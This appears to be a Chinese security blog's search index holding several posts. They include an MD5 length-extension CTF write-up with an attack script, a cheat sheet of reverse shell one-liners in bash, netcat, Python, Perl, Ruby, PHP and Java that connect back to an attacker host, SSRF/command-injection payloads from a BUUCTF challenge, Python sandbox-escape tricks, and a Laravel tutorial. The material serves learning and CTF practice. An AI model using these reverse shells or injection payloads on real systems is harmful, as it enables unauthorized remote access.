<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[哈希长度扩展攻击]]></title>
    <url>%2F2019%2F07%2F30%2F%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[之前做web题碰到md5加密,都是直接用并不了解生成原理.做实验吧让我进来这道题利用了hash长度扩展攻击,那就来好好学习下吧. hash摘要(md5为例) 我要对字符串chenxiyuan进行MD5计算,首先转换成16进制 补位消息必须进行补位,满足消息长度对512取模榆448.这里我要把补位到448bit,补位规则二进制下后面添一个1和n个0直到满足条件:len(message) % 512 == 448.那么16进制下就是先补80即10000000,要补够448bit就是448/8==56,56byte. 补长度补位过后,还要继续填充8byte,储存的是补位之前的消息长度.chenxiyuan是10个字节,80bit,换算成16进制为0x50,然后再填7个字节的0x00. 计算消息摘要计算消息摘要必须用补位已经补长度完成之后的消息来进行运算，拿出 512bit的消息(即64字节). 计算消息摘要的时候,有一个初始的链变量,用来参与第一轮的运算.MD5的初始链变量为:A=0x67452301 B=0xefcdab89 C=0x98badcfe D=0x10325476具体的计算细节就不细说了,只要知道经过一次消息摘要后,上次的链变量会被新的值覆盖,而最后一轮产生的链变量高低位互换后就是计算出来的MD5值. 长度扩展攻击攻击条件$hash = md5($secret.$key):当我们知道一个$key和其对应的$hash以及$secret的长度时,我们就可以构造一个新的$key和$hash满足条件,进而在不知道salt加密的情况下完成攻击. 示例靶机随便提交一下抓包,发现source=0,修改为1成功得到源码.12345678910111213141516171819202122232425262728293031$flag = "XXXXXXXXXXXXXXXXXXXXXXX";$secret = "XXXXXXXXXXXXXXX"; // This secret is 15 characters long for security!$username = $_POST["username"];$password = $_POST["password"];if (!empty($_COOKIE["getmein"])) &#123; if (urldecode($username) === "admin" &amp;&amp; urldecode($password) != "admin") &#123; if ($COOKIE["getmein"] === md5($secret . urldecode($username . $password))) &#123; echo "Congratulations! You are a registered user.\n"; die ("The flag is ". $flag); &#125; else &#123; die ("Your cookies don't match up! STOP HACKING THIS SITE."); &#125; &#125; else &#123; die ("You are not an admin! LEAVE."); &#125;&#125;setcookie("sample-hash", md5($secret . urldecode("admin" . "admin")), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE["source"])) &#123; setcookie("source", 0, time() + (60 * 60 * 24 * 7));&#125;else &#123; if ($_COOKIE["source"] != 0) &#123; echo ""; // This source code is outputted here &#125;&#125; 已知:md5($secret.&quot;adminadmin&quot;)==&#39;571580b26c65f306376d4f64e53cb5c7&#39;,lenth($secret)==15构造payload:首先$secret.&#39;adminadmin&#39;字符串有25个字节,即200bit,按照上面的填充方法,先填充到56个字节\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00.再填8个字节,\xc8\x00\x00\x00\x00\x00\x00\x00,c8就是200.拼接后url编码(将\x换成%)得到最终payload:1username=dmin&amp;password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00chenxiyuan 然后贴个大佬的脚本跑:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155# -*- coding: utf-8 -*-# @Author: King kaki# @Date: 2018-08-04 12:40:11# @Last Modified by: King kaki# @Last Modified time: 2018-08-04 19:07:27import mathF = lambda x, y, z: ((x &amp; y) | ((~x) &amp; z))G = lambda x, y, z: ((x &amp; z) | (y &amp; (~z)))H = lambda x, y, z: (x ^ y ^ z)I = lambda x, y, z: (y ^ (x | (~z)))L = lambda x, n: (((x &lt;&lt; n) | (x &gt;&gt; (32 - n))) &amp; (0xffffffff))shi_1 = (7, 12, 17, 22) * 4shi_2 = (5, 9, 14, 20) * 4shi_3 = (4, 11, 16, 23) * 4shi_4 = (6, 10, 15, 21) * 4m_1 = (0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15)m_2 = (1, 6, 11, 0, 5, 10, 15, 4, 9, 14, 3, 8, 13, 2, 7, 12)m_3 = (5, 8, 11, 14, 1, 4, 7, 10, 13, 0, 3, 6, 9, 12, 15, 2)m_4 = (0, 7, 14, 5, 12, 3, 10, 1, 8, 15, 6, 13, 4, 11, 2, 9)def T(i): return (int(4294967296 * abs(math.sin(i)))) &amp; 0xffffffffdef shift(shift_list): shift_list = [shift_list[3], shift_list[0], shift_list[1], shift_list[2]] return shift_listdef fun(fun_list, f, m, shi): count = 0 global Ti_count while count &lt; 16: xx = int(fun_list[0], 16) + f(int(fun_list[1], 16), int(fun_list[2], 16), int(fun_list[3], 16)) + int(m[count], 16) + T(Ti_count) xx &amp;= 0xffffffff ll = L(xx, shi[count]) fun_list[0] = hex((int(fun_list[1], 16) + ll) &amp; 0xffffffff) fun_list = shift(fun_list) count += 1 Ti_count += 1 return fun_listdef gen_m16(order, ascii_list, f_offset): ii = 0 m16 = [0] * 16 f_offset *= 64 for i in order: i *= 4 m16[ii] = '0x' + ''.join((ascii_list[i + f_offset] + ascii_list[i + 1 + f_offset] + ascii_list[i + 2 + f_offset] + ascii_list[i + 3 + f_offset]).split('0x')) ii += 1 for ind in range(len(m16)): m16[ind] = reverse_hex(m16[ind]) return m16def reverse_hex(hex_str): hex_str = hex_str[2:] if len(hex_str) &lt; 8: hex_str = '0' * (8 - len(hex_str)) + hex_str hex_str_list = [] for i in range(0, len(hex_str), 2): hex_str_list.append(hex_str[i:i + 2]) hex_str_list.reverse() hex_str_result = '0x' + ''.join(hex_str_list) return hex_str_resultdef show_result(f_list): result = '' f_list1 = [0] * 4 for i in f_list: f_list1[f_list.index(i)] = reverse_hex(i)[2:] result += f_list1[f_list.index(i)] return resultdef padding(input_m, msg_lenth=0): ascii_list = list(map(hex, map(ord, input_m))) msg_lenth += len(ascii_list) * 8 ascii_list.append('0x80') for i in range(len(ascii_list)): if len(ascii_list[i]) &lt; 4: ascii_list[i] = '0x' + '0' + ascii_list[i][2:] while (len(ascii_list) * 8 + 64) % 512 != 0: ascii_list.append('0x00') msg_lenth_0x = hex(msg_lenth)[2:] msg_lenth_0x = '0x' + msg_lenth_0x.rjust(16, '0') msg_lenth_0x_big_order = reverse_hex(msg_lenth_0x)[2:] msg_lenth_0x_list = [] for i in range(0, len(msg_lenth_0x_big_order), 2): msg_lenth_0x_list.append('0x' + msg_lenth_0x_big_order[i: i + 2]) ascii_list.extend(msg_lenth_0x_list) return ascii_listdef md5(input_m): global Ti_count Ti_count = 1 abcd_list = ['0x67452301', '0xefcdab89', '0x98badcfe', '0x10325476'] ascii_list = padding(input_m) for i in range(0, len(ascii_list) // 64): aa, bb, cc, dd = abcd_list order_1 = gen_m16(m_1, ascii_list, i) order_2 = gen_m16(m_2, ascii_list, i) order_3 = gen_m16(m_3, ascii_list, i) order_4 = gen_m16(m_4, ascii_list, i) abcd_list = fun(abcd_list, F, order_1, shi_1) abcd_list = fun(abcd_list, G, order_2, shi_2) abcd_list = fun(abcd_list, H, order_3, shi_3) abcd_list = fun(abcd_list, I, order_4, shi_4) output_a = hex((int(abcd_list[0], 16) + int(aa, 16)) &amp; 0xffffffff) output_b = hex((int(abcd_list[1], 16) + int(bb, 16)) &amp; 0xffffffff) output_c = hex((int(abcd_list[2], 16) + int(cc, 16)) &amp; 0xffffffff) output_d = hex((int(abcd_list[3], 16) + int(dd, 16)) &amp; 0xffffffff) abcd_list = [output_a, output_b, output_c, output_d] Ti_count = 1 print(ascii_list) return show_result(abcd_list)# md5-Length Extension Attack: 计算 md5(message + padding + suffix), res = md5(message), len_m = len(message)def md5_lea(suffix, res, len_m): global Ti_count Ti_count = 1 abcd_list = [] for i in range(0, 32, 8): abcd_list.append(reverse_hex('0x' + res[i: i + 8])) ascii_list = padding(suffix, (len_m + 72) // 64 * 64 * 8) # len(message + padding) * 8 for i in range(0, len(ascii_list) // 64): aa, bb, cc, dd = abcd_list order_1 = gen_m16(m_1, ascii_list, i) order_2 = gen_m16(m_2, ascii_list, i) order_3 = gen_m16(m_3, ascii_list, i) order_4 = gen_m16(m_4, ascii_list, i) abcd_list = fun(abcd_list, F, order_1, shi_1) abcd_list = fun(abcd_list, G, order_2, shi_2) abcd_list = fun(abcd_list, H, order_3, shi_3) abcd_list = fun(abcd_list, I, order_4, shi_4) output_a = hex((int(abcd_list[0], 16) + int(aa, 16)) &amp; 0xffffffff) output_b = hex((int(abcd_list[1], 16) + int(bb, 16)) &amp; 0xffffffff) output_c = hex((int(abcd_list[2], 16) + int(cc, 16)) &amp; 0xffffffff) output_d = hex((int(abcd_list[3], 16) + int(dd, 16)) &amp; 0xffffffff) abcd_list = [output_a, output_b, output_c, output_d] Ti_count = 1 # print(ascii_list) return show_result(abcd_list)if __name__ == '__main__': print(md5_lea('chenxiyuan','571580b26c65f306376d4f64e53cb5c7',15)) 抓包添加getmein=994ef981b26dd24cd67d001088e34e24,即可得到flag 总结作为web狗,还是有必要点点其他方向的技能树的.参考了几位大佬的博客:kingkkseaiiSp4rkW]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux反弹shell]]></title>
    <url>%2F2019%2F07%2F29%2Flinux%E5%8F%8D%E5%BC%B9shell%2F</url>
    <content type="text"><![CDATA[之前也看过大牛们做题时利用反弹shell,一直没有仔细研究.今天又看了几位师傅的博客,自己总结一下. 为什么要反弹shell在渗透测试中,当我们可以得到一个可以执行远程命令的漏洞时,我们通常会去获取一个shell,但是通常服务器防火墙亦或者云上都会对端口等进行严格控制.导致不能通过监听端口进行shell连接,这种情况下该怎么获取shell呢?而通常情况下,不论是防火墙还是云盾等防护措施,不会对服务器对外连接进行限制(特殊情况除外),这时候就可以通过反弹shell来获取连接,即通过服务器反向连接一个外部机器来获取一个shell. 反弹shell在理解反弹shell的操作命令前,可以先看一看前辈写的linux文件描述符.攻击机kali:192.168.91.133靶机ubuntu:192.168.91.134 bashbash反弹shell应该是最常见的操作.攻击机kali监听2333端口:1nc -lvp 2333 靶机:1bash -i &gt;&amp; /dev/tcp/192.168.91.133/2333 0&gt;&amp;1 然后kali上就出现了ubuntu的shell. bash -i 表示产生一个交互式的shell dev/tcp/host/port 这个文件非常特殊,可以理解为一个设备.如果host 是一个合法的主机名或internet地址,并且port是一个整数端口号或服务名,bash试图建立与相应的socket(套接字)的TCP连接. netcat反弹shellnetcat的-e参数后面跟一个可执行程序的名称,因为我的ubuntu的netcat是不带这个参数e的,所以这里我用kali作为靶机,ubuntu攻击机.ubuntu监听2333端口:1nc -lvp 2333 kali弹shell给ubuntu:1nc -e /bin/bash 192.168.91.134 2333 成功弹shell. 利用管道反弹shell因为有的发行版linux中netcat是不带这个参数的,这时候可以利用管道进行反弹shell.首先攻击机kali监听两个端口2333,7777:然后ubuntu连接攻击机2333端口,将传递过来的命令交给/bin/bash执行然后将结果返回到7777端口:1nc 192.168.91.133 2333 | /bin/bash | nc 192.168.91.133 7777 监听2333端口的会话成功得到shell,然后执行命令,结果返回在7777端口的会话. 常见脚本反弹python1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' perl方法1:1perl -e 'use Socket;$i="x.x.x.x";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;' 方法2:1perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"x.x.x.x:port");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;' ruby1ruby -rsocket -e 'exit if fork;c=TCPSocket.new("x.x.x.x","port");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end' php1php -r '$sock=fsockopen("x.x.x.x",port);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' java12345678910111213 public class Revs &#123; /** * @param args * @throws Exception */ public static void main(String[] args) throws Exception &#123; // TODO Auto-generated method stub Runtime r = Runtime.getRuntime(); String cmd[]= &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;; Process p = r.exec(cmd); p.waitFor(); &#125;&#125;]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bugku逆向]]></title>
    <url>%2F2019%2F07%2F29%2Fbugku%E9%80%86%E5%90%91%2F</url>
    <content type="text"><![CDATA[从现在要开始学一点逆向二进制了,先做一点bugku简单的逆向题学习学习. 入门逆向下载到后直接拖到IDA里,直接可以看到printf函数.对着最右边的字符一顿R,就得到flag了. Easy_vb下载后拖到IDA,ALT+T搜索字符串,先搜flag搜不到,再搜{就出来了.]]></content>
      <categories>
        <category>逆向学习笔记</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF web writeup(二)]]></title>
    <url>%2F2019%2F07%2F29%2FBUUCTF-web-writeup-%E4%BA%8C%2F</url>
    <content type="text"><![CDATA[Unicorn shop靶机这道题想让我们买独角兽,当ID为1,2,3的时候Wrong commodity!,大于4No commodity found!,并且price只允许一个字符Only one char(?) allowed!,那就是要购买4了并且价格那里只能输入一个字符,但是怎么大于1337呢.F12发现网站编码是utf-8,那应该又是编码转换的问题了,在price写万,亿,兆成功获得flag,当然写其他语言的单位也可以,只要大于1337. SSRFme靶机123456789101112131415&lt;?php if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) &#123; $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR']; &#125; $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]); @mkdir($sandbox); @chdir($sandbox); $data = shell_exec("GET " . escapeshellarg($_GET["url"])); $info = pathinfo($_GET["filename"]); $dir = str_replace(".", "", basename($info["dirname"])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info["basename"]), $data); highlight_file(__FILE__); 看了大佬们的博客才会的,GET命令漏洞如果文件存在会将其拼接到命令中,具体分析在大佬博客查询ip:1curl -L tool.lu/ip php -a进入php命令行交互：1echo md5("orange".yourip); 扫目录payload:1234567891011121314151617181920212223242526272829#先建个文件http://web7.buuoj.cn/?url=&amp;filename=bash -c 'ls /'|#执行命令后输出到chenxiyuanhttp://web7.buuoj.cn/?url=file:bash -c 'ls /'|&amp;filename=chenxiyuan#访问http://web7.buuoj.cn/sandbox/99ca4e36b9277744c847e190081f7fed/chenxiyuan'''binbootdevetcflaghomeliblib64mediamntoptprocreadflagrootrunsbinsrvsystmpusrvar''' 应该是执行/readflag来读取flag了,继续构造payload:123456#创建文件http://web7.buuoj.cn/?url=&amp;filename=bash -c /readflag|#执行命令输出到flaghttp://web7.buuoj.cn/?url=file:bash%20-c%20/readflag|&amp;filename=flag#访问http://web7.buuoj.cn/sandbox/99ca4e36b9277744c847e190081f7fed/flag]]></content>
      <categories>
        <category>web安全学习笔记</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Laravel框架学习]]></title>
    <url>%2F2019%2F07%2F25%2FLaravel%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[composer先切换镜像源吧,不然下不下来laravel框架.1composer config -g repo.packagist composer https://packagist.phpcomposer.com 然后进入网站根目录安装laravel框架1composer create-project laravel/laravel laravel v5.8.17 这里因为我安装的是phpstudy,所以直接访问http://127.0.0.1/laravel/public/即可.也可以cmd进入到public目录,php -S 0.0.0.0:9999,然后访问127.0.0.1:9999 路由建立url和程序之间的映射. 路由文件5.8版本的路由文件在routes-&gt;web.php12345678910111213141516&lt;?php/*|--------------------------------------------------------------------------| Web Routes|--------------------------------------------------------------------------|| Here is where you can register web routes for your application. These| routes are loaded by the RouteServiceProvider within a group which| contains the "web" middleware group. Now create something great!|*/Route::get('/', function () &#123; return view('welcome');&#125;); 各种路由 get路由123Route::get('chenxiyuan',function()&#123; return 'Hello world';&#125;); 访问http://127.0.0.1/laravel/public/chenxiyuan,成功输出Hello world. post路由 123Route::post('post',function()&#123; return 'post';&#125;); match路由 123Route::match(['get','post'],'match',function()&#123; return 'match路由,匹配多种';&#125;); any路由 123Route::any('any',function()&#123; return '任意方法';&#125;); 重定向路由 12Route::redirect('about','chenxiyuan');Route::redirect('about','http://www.chenxiyuan.vip'); 访问http://127.0.0.1/laravel/public/about跳转到http://127.0.0.1/laravel/public/chenxiyuan 视图路由123Route::get('/', function () &#123; return view('welcome');&#125;); 路由传参必须传参123Route::get('user/&#123;id&#125;',function($id)&#123; return 'id:'. $id;&#125;); 访问http://127.0.0.1/laravel/public/user/1,输出:`id:1` 可选传参123Route::get('user/&#123;id?&#125;',function($id=null)&#123; return 'id:'. $id;&#125;); 路由命名命名路由可以方便地为指定路由生成URL或者重定向.通过在路由定义上链式调用name方法指定路由名称：123Route::get('user/profile', function () &#123; return route('profile');&#125;)-&gt;name('profile'); 也可以这样写:123Route::get('home/about',['as'=&gt;'about',function()&#123; return route('about');&#125;]); 访问http://127.0.0.1/laravel/public/home/about,输出`http://127.0.0.1/laravel/public/home/about`. 路由群组12345678910Route::group(['prefix' =&gt; 'group'],function()&#123; Route::match(['get','post'],'match',function()&#123; return 'match路由'; &#125;); Route::get('chenxiyuan',function()&#123; return 'Hello world'; &#125;);&#125;); prefix指定一个前缀,地址需要加上前缀才能访问到. 正则表达式约束你可以使用路由实例上的where方法约束路由参数的格式.where方法接受参数名称和定义参数应如何约束的正则表达式：1234567891011Route::get('user/&#123;name&#125;', function ($name) &#123; //&#125;)-&gt;where('name', '[A-Za-z]+');Route::get('user/&#123;id&#125;', function ($id) &#123; //&#125;)-&gt;where('id', '[0-9]+');Route::get('user/&#123;id&#125;/&#123;name&#125;', function ($id, $name) &#123; //&#125;)-&gt;where(['id' =&gt; '[0-9]+', 'name' =&gt; '[a-z]+']); 控制器真正的项目,并不是把函数方法直接写在路由里的,而是在控制器中定义,再和路由进行关联.控制器目录:app-&gt;Http-&gt;Controllers在Controllers文件夹下新建一个类MemberController.php与Controller.php同目录:1234567891011&lt;?phpnamespace App\Http\Controllers;class MemberController extends Controller&#123; public function info($id) &#123; return 'memberinfo:id='.$id; &#125;&#125; 在路由中注册:Route::get(&#39;memberinfo/{id}&#39;,&#39;MemberController@info&#39;);访问http://127.0.0.1/laravel/public/memberinfo/100,成功输出:memberinfo:id=100 视图为方便运行一下public文件夹cmdphp -S 0.0.0.0:9999视图目录:resources-&gt;views.新建一个greeting.blade.php模板12345&lt;html&gt; &lt;body&gt; &lt;h1&gt;Hello, &#123;&#123; $name &#125;&#125;&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt; 新建一个Greeting.php控制器123456789101112&lt;?phpnamespace App\Http\Controllers;class Greeting extends Controller&#123; public function greet() &#123; return view('greeting',['name'=&gt;'chenxiyuan']); &#125;&#125; 添加到路由:1Route::get('greet','Greeting@greet'); 访问http://127.0.0.1:9999/greet 模型模型文件放在app文件夹下,新建一个Greet.php:1234567891011&lt;?phpnamespace App;use Illuminate\Database\Eloquent\Model;class Greet extends Model&#123; public static function getblog()&#123; return 'chenxiyuan.vip'; &#125;&#125; 改写Greeting控制器:1234567891011&lt;?phpnamespace App\Http\Controllers;use App\Greet;class Greeting extends Controller&#123; public function greet()&#123; return Greet::getblog(); &#125;&#125; 路由不变,访问http://127.0.0.1:9999/greet,成功输出:chenxiyuan.vip 模板Blade 是 Laravel 提供的一个简单而又强大的模板引擎。和其他流行的 PHP 模板引擎不同，Blade 并不限制你在视图中使用原生 PHP 代码。所有 Blade 视图文件都将被编译成原生的 PHP 代码并缓存起来，除非它被修改，否则不会重新编译，这就意味着 Blade 基本上不会给你的应用增加任何负担。Blade 视图文件使用 .blade.php 作为文件扩展名，被存放在 resources/views 目录。 模板继承定义布局主页面:12345678910111213141516&lt;!-- 文件保存于 resources/views/layouts/app.blade.php --&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;应用程序名称 - @yield('title')&lt;/title&gt; &lt;/head&gt; &lt;body&gt; @section('sidebar') 这是主布局的侧边栏。 @show &lt;div class="container"&gt; @yield('content') &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; @section命令定义了视图的一部分内容,而@yield指令是用来显示指定部分的内容. 继承布局当定义子视图时，你可以使用Blade提供的@extends命令来为子视图指定应该 「继承」 的布局.继承Blade布局的视图可使用 @section 命令将内容注入于布局的@section中.而主布局中使用@yield的地方会显示这些子视图中的@section间的内容:123456789101112131415&lt;!-- 文件保存于 resources/views/layouts/child.blade.php --&gt;@extends('layouts.app')@section('title', 'Page Title')@section('sidebar') @parent &lt;p&gt;这将追加到主布局的侧边栏。&lt;/p&gt;@endsection@section('content') &lt;p&gt;这是主体内容。&lt;/p&gt;@endsection 在上面的例子里,@section中的sidebar使用@parent命令在主布局的@section(&#39;sidebar&#39;)中增加内容（不是覆盖）.渲染视图时,@parent指令会被替换为主布局中@section(&#39;sidebar&#39;)间的内容. 流程控制if语句你可以使用@if、@elseif、@else 及 @endif 指令来构建 if 表达式。这些命令的功能等同于 PHP 中的语法:1234567@if (count($records) === 1) 我有一条记录！@elseif (count($records) &gt; 1) 我有多条记录！@else 我没有任何记录！@endif 循环1234567891011121314151617@for ($i = 0; $i &lt; 10; $i++) 目前的值为 &#123;&#123; $i &#125;&#125;@endfor@foreach ($users as $user) &lt;p&gt;此用户为 &#123;&#123; $user-&gt;id &#125;&#125;&lt;/p&gt;@endforeach@forelse ($users as $user) &lt;li&gt;&#123;&#123; $user-&gt;name &#125;&#125;&lt;/li&gt;@empty &lt;p&gt;没有用户&lt;/p&gt;@endforelse@while (true) &lt;p&gt;死循环了。&lt;/p&gt;@endwhile 注释Blade 也能在视图中定义注释。然而，跟 HTML 的注释不同的，Blade 注释不会被包含在应用程序返回的 HTML 内：1&#123;&#123;-- 此注释将不会出现在渲染后的 HTML --&#125;&#125; php在某些情况下，将 PHP 代码嵌入到视图中很有用。你可以使用 Blade 的 @php 指令在模板中执行一段纯 PHP 代码：123@php //@endphp]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>php,web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python安全学习笔记]]></title>
    <url>%2F2019%2F07%2F24%2Fpython%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[也学了挺久的python了,是时候对关于python安全的一些问题做个研究并记录下来了.参考这里python_Sec. Python Sandbox Bypass沙箱逃逸,就是在给我们的一个代码执行环境下(Oj或使用socat生成的交互式终端),脱离种种过滤和限制,最终成功拿到shell权限的过程. 任意代码或者命令执行一些常用的的函数方法: os1234import osos.system('ls')os.popen('ls').read() platform123import platformplatform.popen('ls').read() subprocess1234567import subprocesssubprocess.call('ifconfig',shell=True)subprocess.Popen('ls', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()#python3多了一个run方法subprocess.run('ifconfig',shell=True) 如果shell=True的话,curl命令是被Bash(Sh)启动.所以支持shell语法, 如果shell=False的话.启动的是可执行程序本身,后面的参数不再支持shell语法.如果shell=False,你需要用数组表示.1234567subprocess.call('curl www.baidu.com',shell=False)#这样是会报错的subprocess.call('curl www.baidu.com',shell=True)#改成True成功subprocess.call(['curl','www.baidu.com'],shell=False)#用数组表示,第一个是命令,之后都是参数#再看一个例子subprocess.call('cat 1.txt',shell=True)#正确subprocess.call('cat 1.txt',shell=False)#报错subprocess.call(['cat','1.txt'],shell=False)#成功 exec(),eval(),execfile()123456789101112eval('__import__("os").system("ls")')exec('__import__("os").system("ls")')"""execfile() 函数可以用来执行一个文件。execfile(filename[, globals[, locals]])filename -- 文件名。globals -- 变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。locals -- 变量作用域，局部命名空间，如果被提供，可以是任何映射对象。返回表达式执行结果。"""execfile('/usr/lib/python2.7/os.py')system('ls')#os的所有函数都被直接引入到了环境中,可以直接执行 timeit12import timeittimeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;ls&apos;)&quot;,number=1) 不一样的importimport机制如果导入的模块a中有着另一个模块b，那么，我们可以用a.b的方法或者a.dict[b]的方法间接访问模块b1234567&gt;&gt;&gt; f = open('test.py')&gt;&gt;&gt; f.read()'import os'&gt;&gt;&gt; import test&gt;&gt;&gt; test.os.system('dir')###等价于&gt;&gt;&gt; test.__dict__['os'].system('dir') __import__import module == __import__(&#39;module&#39;) 123__import__('os').system('ls')#加上编码绕过__import__('bf'.decode('rot_13')).system('ls') importlibimportlib.import_module(name, package=None)123importlib.import_module('bf'.decode('rot_13')).system('ls')importlib.__import__('os').system('ls')#python3新加,python2无 内置函数不用引入直接使用的内置函数称为 builtin 函数,随着builtins这一个module 自动被引入到环境中.12&gt;&gt;&gt; dir(__builtins__)['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '_', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'breakpoint', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip'] 内置函数搭配加密可以绕过字符串过滤.123__builtins__.__dict__[&apos;__import__&apos;](&apos;os&apos;).system(&apos;ls&apos;)#假如import和os被过滤__builtins__.__dict__[&apos;__vzcbeg__&apos;.decode(&apos;rot_13&apos;)](&apos;bf&apos;.decode(&apos;rot_13&apos;)).system(&apos;ls&apos;) 如果builtins的一些危险函数被del，可以用reload方法重载,就可以得到一个完整的builtins.123del __builtins__.__dict__[&apos;eval&apos;]del __builtins__.__dict__[&apos;__import__&apos;]reload(__builtins__) 但是在python3下,如果import被删除,就不能reload了,reload已经不在内置函数里了,需要导入imp库或importlib库,才能reload:12345&gt;&gt;&gt; del __builtins__.__import__&gt;&gt;&gt; reload(__builtins__)Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;NameError: name &apos;reload&apos; is not defined 引入object命令执行python的object类中集成了很多的基础函数,我们想要调用的时候也是需要用object去操作的,主要是通过__mro__和__bases__两种方式来创建.1234567&gt;&gt;&gt; class A(object):pass&gt;&gt;&gt; class B(object):pass&gt;&gt;&gt; class C(A,B):pass&gt;&gt;&gt; C.__bases__ (&lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;)&gt;&gt;&gt; C.__mro__(&lt;class '__main__.C'&gt;, &lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;, &lt;class 'object'&gt;) __mro__方法可打印出其继承关系.bases方法可以获取上一层继承关系(如果是多层继承则返回上一层的东西，可能有多个).创建object对象的方法:1234567891011121314151617&gt;&gt;&gt; ''.__class__.__mro__[2]&lt;type 'object'&gt;&lt;type 'object'&gt;&gt;&gt;&gt; ().__class__.__bases__[0]&lt;type 'object'&gt;&gt;&gt;&gt; [].__class__.__bases__[0]&lt;type 'object'&gt;&gt;&gt;&gt; &#123;&#125;.__class__.__bases__[0]&lt;type 'object'&gt;&gt;&gt;&gt; ().__class__.__mro__[1]&lt;class 'object'&gt;&gt;&gt;&gt; ''.__class__.__mro__[1]&lt;class 